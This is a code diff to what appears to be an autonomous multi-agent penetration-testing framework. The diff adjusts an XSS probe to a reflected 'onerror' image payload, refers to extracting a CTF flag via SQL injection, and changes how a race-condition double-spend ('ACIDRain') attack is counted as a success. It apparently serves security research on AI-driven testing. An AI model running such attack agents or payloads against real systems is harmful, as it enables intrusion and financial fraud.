@@ -12,6 +12,7 @@ Key Contributions Over Baseline:
 
 import json
 import os
+import re
 import time
 from .tools import SecurityToolbox
 
@@ -88,16 +89,16 @@ class HierarchicalMultiAgent:
                 self.log_event("Injection Specialist", thought_exploit, "UNION_SELECT", "Successfully exfiltrated FLAG via SQLi!")
                 return True
         
-        # If SQLi failed, try XSS
-        thought_xss = f"Injection Specialist: SQLi failed on '{param}'. Shifting hypothesis to Stored/Reflected XSS."
+        # If SQLi failed, try reflected XSS — use double-quoted payload to avoid SQL syntax errors
+        thought_xss = f"Injection Specialist: SQLi failed on '{param}'. Shifting hypothesis to Reflected XSS."
         xss_probe = self.toolbox.web_browsing(
-            method="POST",
+            method="GET",
             url=self.target_url,
-            data={"author": "attacker", param: "<script>alert('pwned')</script>"}
+            params={param: '<img src=x onerror=alert("xss")>'}
         )
-        if "<script>alert('pwned')</script>" in xss_probe:
-            self.blackboard.record_success("XSS", {"param": param, "payload": "<script>"})
-            self.log_event("Injection Specialist", thought_xss, "XSS_INJECT", "Stored XSS trigger verified in DOM.")
+        if 'onerror=alert("xss")' in xss_probe:
+            self.blackboard.record_success("XSS", {"param": param, "payload": '<img src=x onerror=alert("xss")>'})
+            self.log_event("Injection Specialist", thought_xss, "XSS_REFLECT", "Reflected XSS payload echoed unsanitized in HTML response.")
             return True
 
         self.blackboard.record_failure(f"Injection on {param}", "No error reflection or DOM execution")
@@ -152,11 +153,12 @@ final_bal = requests.get(status_url).json().get('balance', 0)
 print(f'Initial: {{init_bal}}, Final: {{final_bal}}, Profit: {{final_bal - init_bal}}')
 """
         res = self.toolbox.code_interpreter(code)
-        if "Profit:" in res and not res.endswith("Profit: 0") and not res.endswith("Profit: 50"):
+        profit_match = re.search(r'Profit: (\d+)', res)
+        if profit_match and int(profit_match.group(1)) > 50:
             self.blackboard.record_success("ACIDRain_Concurrency", {"proof": res.strip()})
             self.log_event("Concurrency Specialist", thought, "code_interpreter(burst_race)", f"ACIDRain Double Spend Successful: {res.strip()}")
             return True
-        
+
         self.blackboard.record_failure("ACIDRain", "Transactions strictly serialized.")
         return False
 
